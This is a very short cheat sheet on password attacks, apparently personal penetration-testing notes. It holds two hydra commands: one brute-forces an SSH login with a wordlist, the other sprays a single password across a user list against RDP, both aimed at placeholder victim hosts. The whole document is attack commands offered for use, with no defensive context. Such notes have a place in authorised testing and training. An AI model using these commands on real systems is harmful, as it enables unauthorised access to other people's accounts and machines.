# Password attacks

## Wordlist

```
hydra -l user -P wordlist.txt -s PortVictim ssh://IpVictim
```

## Spraying

```
hydra -L userlist.txt -p "hackedpassword" rdp://IpVictim
```


